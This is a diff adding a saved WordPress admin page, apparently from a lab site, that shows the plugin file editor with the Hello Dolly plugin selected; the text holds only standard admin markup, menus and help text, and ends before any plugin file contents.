@@ -1,0 +1,512 @@
+<!DOCTYPE html>
+<html class="wp-toolbar"
+	lang="en-US">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+	<title>Edit Plugins &lsaquo; RENTAL PLATFORM &#8212; WordPress</title>
+<script type="text/javascript">
+addLoadEvent = function(func){if(typeof jQuery!=='undefined')jQuery(function(){func();});else if(typeof wpOnload!=='function'){wpOnload=func;}else{var oldonload=wpOnload;wpOnload=function(){oldonload();func();}}};
+var ajaxurl = '/wp-admin/admin-ajax.php',
+	pagenow = 'plugin-editor',
+	typenow = '',
+	adminpage = 'plugin-editor-php',
+	thousandsSeparator = ',',
+	decimalPoint = '.',
+	isRtl = 0;
+</script>
+<link rel='stylesheet' href='https://0x06.0ffsec.com/wp-admin/load-styles.php?c=0&amp;dir=ltr&amp;load%5Bchunk_0%5D=dashicons,admin-bar,code-editor,common,forms,admin-menu,dashboard,list-tables,edit,revisions,media,themes,about,nav-menus,wp-poi&amp;load%5Bchunk_1%5D=nter,widgets,site-icon,l10n,buttons,wp-auth-check,wp-components,wp-commands&amp;ver=6.9.1' media='all' />
+<style>
+@media print { #wpadminbar { display:none; } }
+/*# sourceURL=css-inline-concat-dashicons%2Cadmin-bar%2Ccode-editor%2Ccommon%2Cforms%2Cadmin-menu%2Cdashboard%2Clist-tables%2Cedit%2Crevisions%2Cmedia%2Cthemes%2Cabout%2Cnav-menus%2Cwp-pointer%2Cwidgets%2Csite-icon%2Cl10n%2Cbuttons%2Cwp-auth-check%2Cwp-components%2Cwp-commands */
+</style>
+<link rel='stylesheet' id='wp-codemirror-css' href='https://0x06.0ffsec.com/wp-includes/js/codemirror/codemirror.min.css?ver=5.29.1-alpha-ee20357' media='all' />
+<style id='wp-emoji-styles-inline-css'>
+
+	img.wp-smiley, img.emoji {
+		display: inline !important;
+		border: none !important;
+		box-shadow: none !important;
+		height: 1em !important;
+		width: 1em !important;
+		margin: 0 0.07em !important;
+		vertical-align: -0.1em !important;
+		background: none !important;
+		padding: 0 !important;
+	}
+</style>
+<style class='wp-fonts-local'>
+@font-face{font-family:Inter;font-style:normal;font-weight:300 900;font-display:fallback;src:url('https://0x06.0ffsec.com/wp-content/themes/twentytwentyfour/assets/fonts/inter/Inter-VariableFont_slnt,wght.woff2') format('woff2');font-stretch:normal;}
+@font-face{font-family:Cardo;font-style:normal;font-weight:400;font-display:fallback;src:url('https://0x06.0ffsec.com/wp-content/themes/twentytwentyfour/assets/fonts/cardo/cardo_normal_400.woff2') format('woff2');}
+@font-face{font-family:Cardo;font-style:italic;font-weight:400;font-display:fallback;src:url('https://0x06.0ffsec.com/wp-content/themes/twentytwentyfour/assets/fonts/cardo/cardo_italic_400.woff2') format('woff2');}
+@font-face{font-family:Cardo;font-style:normal;font-weight:700;font-display:fallback;src:url('https://0x06.0ffsec.com/wp-content/themes/twentytwentyfour/assets/fonts/cardo/cardo_normal_700.woff2') format('woff2');}
+</style>
+<style class='wp-fonts-local'>
+@font-face{font-family:"Instrument Sans";font-style:normal;font-weight:400 700;font-display:fallback;src:url('https://0x06.0ffsec.com/wp-content/themes/twentytwentyfour/assets/fonts/instrument-sans/InstrumentSans-VariableFont_wdth,wght.woff2') format('woff2');}
+@font-face{font-family:"Instrument Sans";font-style:italic;font-weight:400 700;font-display:fallback;src:url('https://0x06.0ffsec.com/wp-content/themes/twentytwentyfour/assets/fonts/instrument-sans/InstrumentSans-Italic-VariableFont_wdth,wght.woff2') format('woff2');}
+@font-face{font-family:Jost;font-style:normal;font-weight:100 900;font-display:fallback;src:url('https://0x06.0ffsec.com/wp-content/themes/twentytwentyfour/assets/fonts/jost/Jost-VariableFont_wght.woff2') format('woff2');}
+@font-face{font-family:Jost;font-style:italic;font-weight:100 900;font-display:fallback;src:url('https://0x06.0ffsec.com/wp-content/themes/twentytwentyfour/assets/fonts/jost/Jost-Italic-VariableFont_wght.woff2') format('woff2');}
+@font-face{font-family:Inter;font-style:normal;font-weight:300 900;font-display:fallback;src:url('https://0x06.0ffsec.com/wp-content/themes/twentytwentyfour/assets/fonts/inter/Inter-VariableFont_slnt,wght.woff2') format('woff2');font-stretch:normal;}
+@font-face{font-family:Cardo;font-style:normal;font-weight:400;font-display:fallback;src:url('https://0x06.0ffsec.com/wp-content/themes/twentytwentyfour/assets/fonts/cardo/cardo_normal_400.woff2') format('woff2');}
+@font-face{font-family:Cardo;font-style:italic;font-weight:400;font-display:fallback;src:url('https://0x06.0ffsec.com/wp-content/themes/twentytwentyfour/assets/fonts/cardo/cardo_italic_400.woff2') format('woff2');}
+@font-face{font-family:Cardo;font-style:normal;font-weight:700;font-display:fallback;src:url('https://0x06.0ffsec.com/wp-content/themes/twentytwentyfour/assets/fonts/cardo/cardo_normal_700.woff2') format('woff2');}
+@font-face{font-family:Inter;font-style:normal;font-weight:300 900;font-display:fallback;src:url('https://0x06.0ffsec.com/wp-content/themes/twentytwentyfour/assets/fonts/inter/Inter-VariableFont_slnt,wght.woff2') format('woff2');font-stretch:normal;}
+@font-face{font-family:Jost;font-style:normal;font-weight:100 900;font-display:fallback;src:url('https://0x06.0ffsec.com/wp-content/themes/twentytwentyfour/assets/fonts/jost/Jost-VariableFont_wght.woff2') format('woff2');}
+@font-face{font-family:Jost;font-style:italic;font-weight:100 900;font-display:fallback;src:url('https://0x06.0ffsec.com/wp-content/themes/twentytwentyfour/assets/fonts/jost/Jost-Italic-VariableFont_wght.woff2') format('woff2');}
+@font-face{font-family:Cardo;font-style:normal;font-weight:400;font-display:fallback;src:url('https://0x06.0ffsec.com/wp-content/themes/twentytwentyfour/assets/fonts/cardo/cardo_normal_400.woff2') format('woff2');}
+@font-face{font-family:Cardo;font-style:italic;font-weight:400;font-display:fallback;src:url('https://0x06.0ffsec.com/wp-content/themes/twentytwentyfour/assets/fonts/cardo/cardo_italic_400.woff2') format('woff2');}
+@font-face{font-family:Cardo;font-style:normal;font-weight:700;font-display:fallback;src:url('https://0x06.0ffsec.com/wp-content/themes/twentytwentyfour/assets/fonts/cardo/cardo_normal_700.woff2') format('woff2');}
+@font-face{font-family:Jost;font-style:normal;font-weight:100 900;font-display:fallback;src:url('https://0x06.0ffsec.com/wp-content/themes/twentytwentyfour/assets/fonts/jost/Jost-VariableFont_wght.woff2') format('woff2');}
+@font-face{font-family:Jost;font-style:italic;font-weight:100 900;font-display:fallback;src:url('https://0x06.0ffsec.com/wp-content/themes/twentytwentyfour/assets/fonts/jost/Jost-Italic-VariableFont_wght.woff2') format('woff2');}
+@font-face{font-family:"Instrument Sans";font-style:normal;font-weight:400 700;font-display:fallback;src:url('https://0x06.0ffsec.com/wp-content/themes/twentytwentyfour/assets/fonts/instrument-sans/InstrumentSans-VariableFont_wdth,wght.woff2') format('woff2');}
+@font-face{font-family:"Instrument Sans";font-style:italic;font-weight:400 700;font-display:fallback;src:url('https://0x06.0ffsec.com/wp-content/themes/twentytwentyfour/assets/fonts/instrument-sans/InstrumentSans-Italic-VariableFont_wdth,wght.woff2') format('woff2');}
+@font-face{font-family:Jost;font-style:normal;font-weight:100 900;font-display:fallback;src:url('https://0x06.0ffsec.com/wp-content/themes/twentytwentyfour/assets/fonts/jost/Jost-VariableFont_wght.woff2') format('woff2');}
+@font-face{font-family:Jost;font-style:italic;font-weight:100 900;font-display:fallback;src:url('https://0x06.0ffsec.com/wp-content/themes/twentytwentyfour/assets/fonts/jost/Jost-Italic-VariableFont_wght.woff2') format('woff2');}
+</style>
+
+<script>
+/* <![CDATA[ */
+var userSettings = {"url":"/","uid":"1","time":"1772450240","secure":"1"};
+//# sourceURL=js-inline-concat-jquery-core%2Cjquery-migrate%2Cutils%2Cwp-codemirror%2Cunderscore
+/* ]]> */
+</script>
+<script src='https://0x06.0ffsec.com/wp-admin/load-scripts.php?c=0&amp;load%5Bchunk_0%5D=jquery-core,jquery-migrate,utils,wp-codemirror,underscore&amp;ver=6.9.1'></script>
+<script src="https://0x06.0ffsec.com/wp-admin/js/code-editor.min.js?ver=6.9.1" id="code-editor-js"></script>
+<script id="code-editor-js-after">
+jQuery.extend( wp.codeEditor.defaultSettings, {"codemirror":{"indentUnit":4,"indentWithTabs":true,"inputStyle":"contenteditable","lineNumbers":true,"lineWrapping":true,"styleActiveLine":true,"continueComments":true,"extraKeys":{"Ctrl-Space":"autocomplete","Ctrl-/":"toggleComment","Cmd-/":"toggleComment","Alt-F":"findPersistent","Ctrl-F":"findPersistent","Cmd-F":"findPersistent"},"direction":"ltr","gutters":[],"mode":"php","autoCloseBrackets":true,"autoCloseTags":true,"matchBrackets":true,"matchTags":{"bothTags":true}},"csslint":{"errors":true,"box-model":true,"display-property-grouping":true,"duplicate-properties":true,"known-properties":true,"outline-none":true},"jshint":{"boss":true,"curly":true,"eqeqeq":true,"eqnull":true,"es3":true,"expr":true,"immed":true,"noarg":true,"nonbsp":true,"onevar":true,"quotmark":"single","trailing":true,"undef":true,"unused":true,"browser":true,"globals":{"_":false,"Backbone":false,"jQuery":false,"JSON":false,"wp":false}},"htmlhint":{"tagname-lowercase":true,"attr-lowercase":true,"attr-value-double-quotes":false,"doctype-first":false,"tag-pair":true,"spec-char-escape":true,"id-unique":true,"src-not-empty":true,"attr-no-duplication":true,"alt-require":true,"space-tab-mixed-disabled":"tab","attr-unsafe-chars":true}} );
+//# sourceURL=code-editor-js-after
+</script>
+<script type="text/javascript">var _wpColorScheme = {"icons":{"base":"#a7aaad","focus":"#72aee6","current":"#fff"}};</script>
+	<link id="wp-admin-canonical" rel="canonical" href="https://0x06.0ffsec.com/wp-admin/plugin-editor.php?plugin=hello.php&#038;Submit=Select" />
+	<script>
+		if ( window.history.replaceState ) {
+			window.history.replaceState( null, null, document.getElementById( 'wp-admin-canonical' ).href + window.location.hash );
+		}
+	</script>
+	<meta name="viewport" content="width=device-width,initial-scale=1.0"></head>
+<body class="wp-admin wp-core-ui no-js w2dc-body plugin-editor-php auto-fold admin-bar branch-6-9 version-6-9-1 admin-color-fresh locale-en-us no-customize-support svg wp-theme-twentytwentyfour">
+<script type="text/javascript">
+	document.body.className = document.body.className.replace('no-js','js');
+</script>
+
+<script>
+		(function() {
+			var request, b = document.body, c = 'className', cs = 'customize-support', rcs = new RegExp('(^|\\s+)(no-)?'+cs+'(\\s+|$)');
+
+				request = true;
+	
+			b[c] = b[c].replace( rcs, ' ' );
+			// The customizer requires postMessage and CORS (if the site is cross domain).
+			b[c] += ( window.postMessage && request ? ' ' : ' no-' ) + cs;
+		}());
+	
+//# sourceURL=wp_customize_support_script
+</script>
+
+<div id="wpwrap">
+
+<div id="adminmenumain" role="navigation" aria-label="Main menu">
+<a href="#wpbody-content" class="screen-reader-shortcut">Skip to main content</a>
+<a href="#wp-toolbar" class="screen-reader-shortcut">Skip to toolbar</a>
+<div id="adminmenuback"></div>
+<div id="adminmenuwrap">
+<ul id="adminmenu">
+
+
+	<li class="wp-first-item wp-has-submenu wp-not-current-submenu menu-top menu-top-first menu-icon-dashboard menu-top-last" id="menu-dashboard">
+	<a href='index.php' class="wp-first-item wp-has-submenu wp-not-current-submenu menu-top menu-top-first menu-icon-dashboard menu-top-last" data-ariahaspopup><div class='wp-menu-image dashicons-before dashicons-dashboard' aria-hidden='true'><br /></div><div class='wp-menu-name'>Dashboard</div></a>
+	<ul class='wp-submenu wp-submenu-wrap'><li class='wp-submenu-head' aria-hidden='true'>Dashboard</li><li class="wp-first-item"><a href='index.php' class="wp-first-item">Home</a></li><li><a href='update-core.php'>Updates <span class="update-plugins count-1"><span class="update-count">1</span></span></a></li></ul></li>
+	<li class="wp-not-current-submenu wp-menu-separator" aria-hidden="true"><div class="separator"></div></li>
+	<li class="wp-has-submenu wp-not-current-submenu menu-top menu-icon-post open-if-no-js menu-top-first" id="menu-posts">
+	<a href='edit.php' class="wp-has-submenu wp-not-current-submenu menu-top menu-icon-post open-if-no-js menu-top-first" data-ariahaspopup><div class='wp-menu-image dashicons-before dashicons-admin-post' aria-hidden='true'><br /></div><div class='wp-menu-name'>Posts</div></a>
+	<ul class='wp-submenu wp-submenu-wrap'><li class='wp-submenu-head' aria-hidden='true'>Posts</li><li class="wp-first-item"><a href='edit.php' class="wp-first-item">All Posts</a></li><li><a href='post-new.php'>Add Post</a></li><li><a href='edit-tags.php?taxonomy=category'>Categories</a></li><li><a href='edit-tags.php?taxonomy=post_tag'>Tags</a></li></ul></li>
+	<li class="wp-has-submenu wp-not-current-submenu menu-top menu-icon-media" id="menu-media">
+	<a href='upload.php' class="wp-has-submenu wp-not-current-submenu menu-top menu-icon-media" data-ariahaspopup><div class='wp-menu-image dashicons-before dashicons-admin-media' aria-hidden='true'><br /></div><div class='wp-menu-name'>Media</div></a>
+	<ul class='wp-submenu wp-submenu-wrap'><li class='wp-submenu-head' aria-hidden='true'>Media</li><li class="wp-first-item"><a href='upload.php' class="wp-first-item">Library</a></li><li><a href='media-new.php'>Add Media File</a></li></ul></li>
+	<li class="wp-has-submenu wp-not-current-submenu menu-top menu-icon-page" id="menu-pages">
+	<a href='edit.php?post_type=page' class="wp-has-submenu wp-not-current-submenu menu-top menu-icon-page" data-ariahaspopup><div class='wp-menu-image dashicons-before dashicons-admin-page' aria-hidden='true'><br /></div><div class='wp-menu-name'>Pages</div></a>
+	<ul class='wp-submenu wp-submenu-wrap'><li class='wp-submenu-head' aria-hidden='true'>Pages</li><li class="wp-first-item"><a href='edit.php?post_type=page' class="wp-first-item">All Pages</a></li><li><a href='post-new.php?post_type=page'>Add Page</a></li></ul></li>
+	<li class="wp-not-current-submenu menu-top menu-icon-comments" id="menu-comments">
+	<a href='edit-comments.php' class="wp-not-current-submenu menu-top menu-icon-comments" ><div class='wp-menu-image dashicons-before dashicons-admin-comments' aria-hidden='true'><br /></div><div class='wp-menu-name'>Comments <span class="awaiting-mod count-0"><span class="pending-count" aria-hidden="true">0</span><span class="comments-in-moderation-text screen-reader-text">0 Comments in moderation</span></span></div></a></li>
+	<li class="wp-has-submenu wp-not-current-submenu menu-top menu-icon-wcsearch_form" id="menu-posts-wcsearch_form">
+	<a href='edit.php?post_type=wcsearch_form' class="wp-has-submenu wp-not-current-submenu menu-top menu-icon-wcsearch_form" data-ariahaspopup><div class='wp-menu-image dashicons-before' aria-hidden='true'><img src="https://0x06.0ffsec.com/wp-content/plugins/web-directory-free/search/plugin/resources/images/menuicon.png" alt="" /></div><div class='wp-menu-name'>Search Forms</div></a>
+	<ul class='wp-submenu wp-submenu-wrap'><li class='wp-submenu-head' aria-hidden='true'>Search Forms</li><li class="wp-first-item"><a href='edit.php?post_type=wcsearch_form' class="wp-first-item">Search Forms</a></li><li><a href='post-new.php?post_type=wcsearch_form'>Create new search form</a></li></ul></li>
+	<li class="wp-has-submenu wp-not-current-submenu menu-top menu-icon-w2dc_listing menu-top-last" id="menu-posts-w2dc_listing">
+	<a href='edit.php?post_type=w2dc_listing' class="wp-has-submenu wp-not-current-submenu menu-top menu-icon-w2dc_listing menu-top-last" data-ariahaspopup><div class='wp-menu-image dashicons-before' aria-hidden='true'><img src="https://0x06.0ffsec.com/wp-content/plugins/web-directory-free/resources/images/menuicon.png" alt="" /></div><div class='wp-menu-name'>Directory listings</div></a>
+	<ul class='wp-submenu wp-submenu-wrap'><li class='wp-submenu-head' aria-hidden='true'>Directory listings</li><li class="wp-first-item"><a href='edit.php?post_type=w2dc_listing' class="wp-first-item">Directory listings</a></li><li><a href='post-new.php?post_type=w2dc_listing'>Create new listing</a></li><li><a href='edit-tags.php?taxonomy=w2dc-category&amp;post_type=w2dc_listing'>Directory categories</a></li><li><a href='edit-tags.php?taxonomy=w2dc-location&amp;post_type=w2dc_listing'>Directory locations</a></li><li><a href='edit-tags.php?taxonomy=w2dc-tag&amp;post_type=w2dc_listing'>Directory tags</a></li></ul></li>
+	<li class="wp-not-current-submenu wp-menu-separator" aria-hidden="true"><div class="separator"></div></li>
+	<li class="wp-has-submenu wp-not-current-submenu menu-top menu-icon-appearance menu-top-first" id="menu-appearance">
+	<a href='themes.php' class="wp-has-submenu wp-not-current-submenu menu-top menu-icon-appearance menu-top-first" data-ariahaspopup><div class='wp-menu-image dashicons-before dashicons-admin-appearance' aria-hidden='true'><br /></div><div class='wp-menu-name'>Appearance</div></a>
+	<ul class='wp-submenu wp-submenu-wrap'><li class='wp-submenu-head' aria-hidden='true'>Appearance</li><li class="wp-first-item"><a href='themes.php' class="wp-first-item">Themes <span class="update-plugins count-0"><span class="theme-count">0</span></span></a></li><li><a href='site-editor.php'>Editor</a></li><li><a href='themes.php?page=w2dc_settings'>Directory settings</a></li></ul></li>
+	<li class="wp-has-submenu wp-not-current-submenu menu-top menu-icon-plugins" id="menu-plugins">
+	<a href='plugins.php' class="wp-has-submenu wp-not-current-submenu menu-top menu-icon-plugins" data-ariahaspopup><div class='wp-menu-image dashicons-before dashicons-admin-plugins' aria-hidden='true'><br /></div><div class='wp-menu-name'>Plugins <span class="update-plugins count-1"><span class="plugin-count">1</span></span></div></a>
+	<ul class='wp-submenu wp-submenu-wrap'><li class='wp-submenu-head' aria-hidden='true'>Plugins <span class="update-plugins count-1"><span class="plugin-count">1</span></span></li><li class="wp-first-item"><a href='plugins.php' class="wp-first-item">Installed Plugins</a></li><li><a href='plugin-install.php'>Add Plugin</a></li></ul></li>
+	<li class="wp-has-submenu wp-not-current-submenu menu-top menu-icon-users" id="menu-users">
+	<a href='users.php' class="wp-has-submenu wp-not-current-submenu menu-top menu-icon-users" data-ariahaspopup><div class='wp-menu-image dashicons-before dashicons-admin-users' aria-hidden='true'><br /></div><div class='wp-menu-name'>Users</div></a>
+	<ul class='wp-submenu wp-submenu-wrap'><li class='wp-submenu-head' aria-hidden='true'>Users</li><li class="wp-first-item"><a href='users.php' class="wp-first-item">All Users</a></li><li><a href='user-new.php'>Add User</a></li><li><a href='profile.php'>Profile</a></li></ul></li>
+	<li class="wp-has-submenu wp-has-current-submenu wp-menu-open menu-top menu-icon-tools" id="menu-tools">
+	<a href='tools.php' class="wp-has-submenu wp-has-current-submenu wp-menu-open menu-top menu-icon-tools" ><div class='wp-menu-image dashicons-before dashicons-admin-tools' aria-hidden='true'><br /></div><div class='wp-menu-name'>Tools</div></a>
+	<ul class='wp-submenu wp-submenu-wrap'><li class='wp-submenu-head' aria-hidden='true'>Tools</li><li class="wp-first-item"><a href='tools.php' class="wp-first-item">Available Tools</a></li><li><a href='import.php'>Import</a></li><li><a href='export.php'>Export</a></li><li><a href='site-health.php'>Site Health <span class="menu-counter site-health-counter count-1"><span class="count">1</span></span></a></li><li><a href='export-personal-data.php'>Export Personal Data</a></li><li><a href='erase-personal-data.php'>Erase Personal Data</a></li><li><a href='theme-editor.php'>Theme File Editor</a></li><li class="current"><a href='plugin-editor.php' class="current" aria-current="page">Plugin File Editor</a></li></ul></li>
+	<li class="wp-has-submenu wp-not-current-submenu menu-top menu-icon-settings menu-top-last" id="menu-settings">
+	<a href='options-general.php' class="wp-has-submenu wp-not-current-submenu menu-top menu-icon-settings menu-top-last" data-ariahaspopup><div class='wp-menu-image dashicons-before dashicons-admin-settings' aria-hidden='true'><br /></div><div class='wp-menu-name'>Settings</div></a>
+	<ul class='wp-submenu wp-submenu-wrap'><li class='wp-submenu-head' aria-hidden='true'>Settings</li><li class="wp-first-item"><a href='options-general.php' class="wp-first-item">General</a></li><li><a href='options-writing.php'>Writing</a></li><li><a href='options-reading.php'>Reading</a></li><li><a href='options-discussion.php'>Discussion</a></li><li><a href='options-media.php'>Media</a></li><li><a href='options-permalink.php'>Permalinks</a></li><li><a href='options-privacy.php'>Privacy</a></li></ul></li>
+	<li class="wp-not-current-submenu wp-menu-separator" aria-hidden="true"><div class="separator"></div></li>
+	<li class="wp-has-submenu wp-not-current-submenu menu-top toplevel_page_w2dc_settings menu-top-first menu-top-last" id="toplevel_page_w2dc_settings"><a href='admin.php?page=w2dc_settings' class="wp-has-submenu wp-not-current-submenu menu-top toplevel_page_w2dc_settings menu-top-first menu-top-last" data-ariahaspopup><div class='wp-menu-image dashicons-before' aria-hidden='true'><img src="https://0x06.0ffsec.com/wp-content/plugins/web-directory-free/resources/images/menuicon.png" alt="" /></div><div class='wp-menu-name'>Directory Admin</div></a>
+	<ul class='wp-submenu wp-submenu-wrap'><li class='wp-submenu-head' aria-hidden='true'>Directory Admin</li><li class="wp-first-item"><a href='admin.php?page=w2dc_settings' class="wp-first-item">Directory settings</a></li><li><a href='admin.php?page=w2dc_levels'>Listings levels</a></li><li><a href='admin.php?page=w2dc_manage_upgrades'>Listings upgrade</a></li><li><a href='admin.php?page=w2dc_locations_levels'>Locations levels</a></li><li><a href='admin.php?page=w2dc_content_fields'>Content fields</a></li><li><a href='admin.php?page=w2dc_csv_import'>CSV Import/Export</a></li><li><a href='admin.php?page=w2dc_demo_data'>Demo data Import</a></li></ul></li><li id="collapse-menu" class="hide-if-no-js"><button type="button" id="collapse-button" aria-label="Collapse Main Menu" aria-expanded="true"><span class="collapse-button-icon" aria-hidden="true"></span><span class="collapse-button-label">Collapse Menu</span></button></li></ul>
+</div>
+</div>
+<div id="wpcontent">
+
+		<div id="wpadminbar" class="nojq nojs">
+						<div class="quicklinks" id="wp-toolbar" role="navigation" aria-label="Toolbar">
+				<ul role='menu' id='wp-admin-bar-root-default' class="ab-top-menu"><li role='group' id='wp-admin-bar-menu-toggle'><a class='ab-item' role="menuitem" href='#'><span class="ab-icon" aria-hidden="true"></span><span class="screen-reader-text">Menu</span></a></li><li role='group' id='wp-admin-bar-wp-logo' class="menupop"><a class='ab-item' role="menuitem" aria-expanded="false" href='https://0x06.0ffsec.com/wp-admin/about.php'><span class="ab-icon" aria-hidden="true"></span><span class="screen-reader-text">About WordPress</span></a><div class="ab-sub-wrapper"><ul role='menu' aria-label='About WordPress' id='wp-admin-bar-wp-logo-default' class="ab-submenu"><li role='group' id='wp-admin-bar-about'><a class='ab-item' role="menuitem" href='https://0x06.0ffsec.com/wp-admin/about.php'>About WordPress</a></li><li role='group' id='wp-admin-bar-contribute'><a class='ab-item' role="menuitem" href='https://0x06.0ffsec.com/wp-admin/contribute.php'>Get Involved</a></li></ul><ul role='menu' aria-label='About WordPress' id='wp-admin-bar-wp-logo-external' class="ab-sub-secondary ab-submenu"><li role='group' id='wp-admin-bar-wporg'><a class='ab-item' role="menuitem" href='https://wordpress.org/'>WordPress.org</a></li><li role='group' id='wp-admin-bar-documentation'><a class='ab-item' role="menuitem" href='https://wordpress.org/documentation/'>Documentation</a></li><li role='group' id='wp-admin-bar-learn'><a class='ab-item' role="menuitem" href='https://learn.wordpress.org/'>Learn WordPress</a></li><li role='group' id='wp-admin-bar-support-forums'><a class='ab-item' role="menuitem" href='https://wordpress.org/support/forums/'>Support</a></li><li role='group' id='wp-admin-bar-feedback'><a class='ab-item' role="menuitem" href='https://wordpress.org/support/forum/requests-and-feedback'>Feedback</a></li></ul></div></li><li role='group' id='wp-admin-bar-site-name' class="menupop"><a class='ab-item' role="menuitem" aria-expanded="false" href='https://0x06.0ffsec.com/'>RENTAL PLATFORM</a><div class="ab-sub-wrapper"><ul role='menu' aria-label='RENTAL PLATFORM' id='wp-admin-bar-site-name-default' class="ab-submenu"><li role='group' id='wp-admin-bar-view-site'><a class='ab-item' role="menuitem" href='https://0x06.0ffsec.com/'>Visit Site</a></li></ul></div></li><li role='group' id='wp-admin-bar-updates'><a class='ab-item' role="menuitem" href='https://0x06.0ffsec.com/wp-admin/update-core.php'><span class="ab-icon" aria-hidden="true"></span><span class="ab-label" aria-hidden="true">1</span><span class="screen-reader-text updates-available-text">1 update available</span></a></li><li role='group' id='wp-admin-bar-comments'><a class='ab-item' role="menuitem" href='https://0x06.0ffsec.com/wp-admin/edit-comments.php'><span class="ab-icon" aria-hidden="true"></span><span class="ab-label awaiting-mod pending-count count-0" aria-hidden="true">0</span><span class="screen-reader-text comments-in-moderation-text">0 Comments in moderation</span></a></li><li role='group' id='wp-admin-bar-new-content' class="menupop"><a class='ab-item' role="menuitem" aria-expanded="false" href='https://0x06.0ffsec.com/wp-admin/post-new.php'><span class="ab-icon" aria-hidden="true"></span><span class="ab-label">New</span></a><div class="ab-sub-wrapper"><ul role='menu' aria-label='New' id='wp-admin-bar-new-content-default' class="ab-submenu"><li role='group' id='wp-admin-bar-new-post'><a class='ab-item' role="menuitem" href='https://0x06.0ffsec.com/wp-admin/post-new.php'>Post</a></li><li role='group' id='wp-admin-bar-new-media'><a class='ab-item' role="menuitem" href='https://0x06.0ffsec.com/wp-admin/media-new.php'>Media</a></li><li role='group' id='wp-admin-bar-new-page'><a class='ab-item' role="menuitem" href='https://0x06.0ffsec.com/wp-admin/post-new.php?post_type=page'>Page</a></li><li role='group' id='wp-admin-bar-new-wcsearch_form'><a class='ab-item' role="menuitem" href='https://0x06.0ffsec.com/wp-admin/post-new.php?post_type=wcsearch_form'>Search Form</a></li><li role='group' id='wp-admin-bar-new-w2dc_listing'><a class='ab-item' role="menuitem" href='https://0x06.0ffsec.com/wp-admin/post-new.php?post_type=w2dc_listing'>Directory listing</a></li><li role='group' id='wp-admin-bar-new-user'><a class='ab-item' role="menuitem" href='https://0x06.0ffsec.com/wp-admin/user-new.php'>User</a></li></ul></div></li></ul><ul role='menu' id='wp-admin-bar-top-secondary' class="ab-top-secondary ab-top-menu"><li role='group' id='wp-admin-bar-my-account' class="menupop with-avatar"><a class='ab-item' role="menuitem" aria-expanded="false" href='https://0x06.0ffsec.com/wp-admin/profile.php'>Howdy, <span class="display-name">admin</span><img alt='' src='https://secure.gravatar.com/avatar/bea71dc5859cb9be4b347f3d140bd2422b6dfad80b4fb971a2a41856bc77879e?s=26&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/bea71dc5859cb9be4b347f3d140bd2422b6dfad80b4fb971a2a41856bc77879e?s=52&#038;d=mm&#038;r=g 2x' class='avatar avatar-26 photo' height='26' width='26' loading='lazy' decoding='async'/></a><div class="ab-sub-wrapper"><ul role='menu' aria-label='Howdy, admin' id='wp-admin-bar-user-actions' class="ab-submenu"><li role='group' id='wp-admin-bar-user-info'><a class='ab-item' role="menuitem" href='https://0x06.0ffsec.com/wp-admin/profile.php'><img alt='' src='https://secure.gravatar.com/avatar/bea71dc5859cb9be4b347f3d140bd2422b6dfad80b4fb971a2a41856bc77879e?s=64&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/bea71dc5859cb9be4b347f3d140bd2422b6dfad80b4fb971a2a41856bc77879e?s=128&#038;d=mm&#038;r=g 2x' class='avatar avatar-64 photo' height='64' width='64' loading='lazy' decoding='async'/><span class='display-name'>admin</span><span class='display-name edit-profile'>Edit Profile</span></a></li><li role='group' id='wp-admin-bar-logout'><a class='ab-item' role="menuitem" href='https://0x06.0ffsec.com/wp-login.php?action=logout&#038;_wpnonce=b78f5cf004'>Log Out</a></li></ul></div></li></ul>			</div>
+		</div>
+
+		
+<div id="wpbody" role="main">
+
+<div id="wpbody-content">
+		<div id="screen-meta" class="metabox-prefs">
+
+			<div id="contextual-help-wrap" class="hidden" tabindex="-1" aria-label="Contextual Help Tab">
+				<div id="contextual-help-back"></div>
+				<div id="contextual-help-columns">
+					<div class="contextual-help-tabs">
+						<ul>
+						
+							<li id="tab-link-overview" class="active">
+								<a href="#tab-panel-overview" aria-controls="tab-panel-overview">
+									Overview								</a>
+							</li>
+													</ul>
+					</div>
+
+										<div class="contextual-help-sidebar">
+						<p><strong>For more information:</strong></p><p><a href="https://developer.wordpress.org/advanced-administration/plugins/editor-screen/">Documentation on Editing Plugins</a></p><p><a href="https://developer.wordpress.org/plugins/">Documentation on Writing Plugins</a></p><p><a href="https://wordpress.org/support/forums/">Support forums</a></p>					</div>
+					
+					<div class="contextual-help-tabs-wrap">
+						
+							<div id="tab-panel-overview" class="help-tab-content active">
+								<p>You can use the plugin file editor to make changes to any of your plugins&#8217; individual PHP files. Be aware that if you make changes, plugins updates will overwrite your customizations.</p><p>Choose a plugin to edit from the dropdown menu and click the Select button. Click once on any file name to load it in the editor, and make your changes. Do not forget to save your changes (Update File) when you are finished.</p><p>The documentation menu below the editor lists the PHP functions recognized in the plugin file. Clicking Look Up takes you to a web page about that particular function.</p><p id="editor-keyboard-trap-help-1">When using a keyboard to navigate:</p><ul><li id="editor-keyboard-trap-help-2">In the editing area, the Tab key enters a tab character.</li><li id="editor-keyboard-trap-help-3">To move away from this area, press the Esc key followed by the Tab key.</li><li id="editor-keyboard-trap-help-4">Screen reader users: when in forms mode, you may need to press the Esc key twice.</li></ul><p>If you want to make changes but do not want them to be overwritten when the plugin is updated, you may be ready to think about writing your own plugin. For information on how to edit plugins, write your own from scratch, or just better understand their anatomy, check out the links below.</p>							</div>
+												</div>
+				</div>
+			</div>
+				</div>
+				<div id="screen-meta-links">
+					<div id="contextual-help-link-wrap" class="hide-if-no-js screen-meta-toggle">
+			<button type="button" id="contextual-help-link" class="button show-settings" aria-controls="contextual-help-wrap" aria-expanded="false">Help</button>
+			</div>
+				</div>
+		<div class="wrap">
+<h1>Edit Plugins</h1>
+
+
+<div class="fileedit-sub">
+<div class="alignleft">
+<h2>
+	Editing <strong>Hello Dolly</strong> (inactive)</h2>
+ <span><strong>File: hello.php</strong></span></div>
+<div class="alignright">
+	<form action="plugin-editor.php" method="get">
+		<label for="plugin" id="theme-plugin-editor-selector">Select plugin to edit: </label>
+		<select name="plugin" id="plugin">
+		
+	<option value="akismet/akismet.php" >Akismet Anti-spam: Spam Protection</option>
+	<option value="hello.php"  selected='selected'>Hello Dolly</option>
+	<option value="web-directory-free/w2dc_free.php" >Web Directory Free</option>		</select>
+		<input type="submit" name="Submit" id="Submit" class="button" value="Select"  />	</form>
+</div>
+<br class="clear" />
+</div>
+
+<div id="templateside">
